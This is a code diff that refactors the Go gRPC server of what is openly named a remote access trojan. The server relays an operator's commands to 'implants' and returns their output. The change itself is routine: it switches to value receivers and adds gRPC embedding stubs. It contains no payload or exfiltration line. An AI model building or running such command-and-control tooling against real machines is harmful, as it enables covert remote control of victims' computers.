@@ -8,6 +8,7 @@ import (
 	"net"
 
 	"github.com/lufeee/rat/grpcapi"
+
 	"google.golang.org/grpc"
 )
 
@@ -23,21 +24,15 @@ type adminServer struct {
 	work, output chan *grpcapi.Command
 }
 
-func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
-	s := new(implantServer)
-	s.work = work
-	s.output = output
-	return s
+func NewImplantServer(work, output chan *grpcapi.Command) implantServer {
+	return implantServer{work: work, output: output}
 }
 
-func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
-	s := new(adminServer)
-	s.work = work
-	s.output = output
-	return s
+func NewAdminServer(work, output chan *grpcapi.Command) adminServer {
+	return adminServer{work: work, output: output}
 }
 
-func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
+func (s implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
 	cmd := new(grpcapi.Command)
 	select {
 	case cmd, ok := <-s.work:
@@ -50,12 +45,14 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 	}
 }
 
-func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
+func (s implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
 	s.output <- result
 	return &grpcapi.Empty{}, nil
 }
 
-func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
+func (implantServer) mustEmbedUnimplementedImplantServer() {}
+
+func (s adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
 	res := &grpcapi.Command{}
 	go func() {
 		s.work <- cmd
@@ -63,6 +60,8 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 	res = <-s.output
 	return res, nil
 }
+
+func (adminServer) mustEmbedUnimplementedAdminServer() {}
 
 func main() {
 	var (
